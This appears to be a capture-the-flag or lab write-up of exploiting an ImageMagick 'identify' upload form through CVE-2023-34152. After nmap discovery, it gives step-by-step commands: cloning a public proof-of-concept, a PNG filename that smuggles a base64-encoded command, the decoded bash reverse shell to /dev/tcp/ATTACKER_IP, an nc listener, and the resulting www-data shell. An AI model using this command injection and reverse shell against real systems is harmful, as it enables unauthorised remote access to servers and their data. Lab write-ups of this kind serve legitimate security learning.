# ImageMagick Identifier

An upload form that runs ImageMagick `identify` on the uploaded filename can lead to command execution when the backend invokes `magick identify` through a shell. On the observed target, uploading a crafted PNG filename triggered a reverse shell as `www-data`

## Discovery

Nmap and WhatWeb indicators:

```text
80/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))
|_http-title: ImageMagick Identifier
```

```text
Title[ImageMagick Identifier]
```

The main page had a file upload form and only allowed image extensions such as JPEG or PNG.

Uploading a normal image disclosed the ImageMagick version:

```text
Version: 6.9.6-4
```

## CVE-2023-34152 Payload

Use the public CVE-2023-34152 payload generator:

```bash
git clone https://github.com/SudoIndividual/CVE-2023-34152.git
cd CVE-2023-34152
python3 CVE-2023-34152.py ATTACKER_IP 80
```

The PoC creates a PNG file with a command-injection filename:

```text
|smile"`echo BASE64_REVERSE_SHELL|base64 -d|bash`".png
```

The observed payload decoded to:

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1"
```

Start a listener and upload the generated PNG:

```bash
nc -nlvp 80
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@image:/var/www/html$
```

Process output showed the vulnerable execution path:

```text
sh -c magick identify upload/|smile%22`echo BASE64_REVERSE_SHELL|base64 -d|bash`%22.png
```
